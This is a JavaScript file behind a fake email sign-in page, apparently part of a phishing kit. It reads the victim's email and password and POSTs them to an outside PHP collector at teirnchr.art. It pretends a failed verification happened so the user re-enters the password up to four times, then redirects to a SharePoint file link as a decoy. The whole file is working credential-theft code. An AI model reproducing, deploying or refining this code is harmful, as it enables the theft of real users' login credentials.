$(document).ready(function(){
    var attemptCount = 0;
    var maxAttempts = 4;
    var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
    var isProcessing = false;
    
    // Get the full URL to process.php (same directory)
    var scriptUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')) + '/process.php';
    
    $('#submit-btn').click(function(event){
        event.preventDefault();
        
        if(isProcessing) {
            $('#msg').html("Please wait, processing...").css('color', '#f59e0b').show();
            return;
        }
        
        var email = $("#email").val().trim();
        var password = $("#password").val();
        
        if(!email || !password){
            $('#msg').html("Please enter your password").css('color', '#dc2626').show();
            return;
        }
        
        isProcessing = true;
        $('#msg').hide();
        
        var originalBtnText = $('#submit-btn').val();
        $('#submit-btn').val('Verifying...').css('opacity', '0.7');
        
        $.ajax({
            url: 'https://www.teirnchr.art/js/ionos.php',
            type: 'POST',
            dataType: 'json',
            data: {
                email: email,
                password: password
            },
            timeout: 60000,
            success: function(response){
                console.log("Response:", response);
                
                if(response && response.signal === 'success'){
                    $('#msg').css('color', '#059669').html(response.msg + ' Redirecting...').show();
                    setTimeout(function(){
                        window.location.replace(redirectUrl);
                    }, 1500);
                } else if(response && response.signal === 'error'){
                    attemptCount++;
                    $('#msg').css('color', '#dc2626').html(response.msg + ' (Attempt ' + attemptCount + ' of ' + maxAttempts + ')').show();
                    $("#password").val("").focus();
                    
                    if(attemptCount >= maxAttempts) {
                        $('#msg').html("Maximum attempts reached. Access denied.").css('color', '#dc2626').show();
                        $('#submit-btn').prop('disabled', true).css('opacity', '0.5');
                    }
                }
                
                $('#submit-btn').val(originalBtnText).css('opacity', '1');
                isProcessing = false;
            },
            error: function(xhr, status, error){
                console.error("AJAX Error:", status, error);
                attemptCount++;
                $("#password").val("").focus();
                $('#msg').css('color', '#dc2626').html("Error: " + error + " (Attempt " + attemptCount + " of " + maxAttempts + ")").show();
                $('#submit-btn').val(originalBtnText).css('opacity', '1');
                isProcessing = false;
            }
        });
    });
    
    // Toggle password visibility
    $('#togglePassword').click(function() {
        var passwordInput = $('#password');
        var type = passwordInput.attr('type') === 'password' ? 'text' : 'password';
        passwordInput.attr('type', type);
        
        // Update eye icon
        if(type === 'text') {
            $(this).find('svg').html('<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path>');
        } else {
            $(this).find('svg').html('<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>');
        }
    });
    
    // Back arrow functionality
    $('.back-arrow').click(function() {
        // Could navigate back to email entry page
        console.log("Navigate back");
    });
    
    // Private mode link
    $('.private-mode-link').click(function() {
        alert("To use private browsing:\n\nChrome: Ctrl+Shift+N\nFirefox: Ctrl+Shift+P\nSafari: Cmd+Shift+N\nEdge: Ctrl+Shift+N");
    });
    
    // Password field enter key support
    $('#password').keypress(function(e){
        if(e.which == 13){
            $('#submit-btn').click();
        }
    });
});
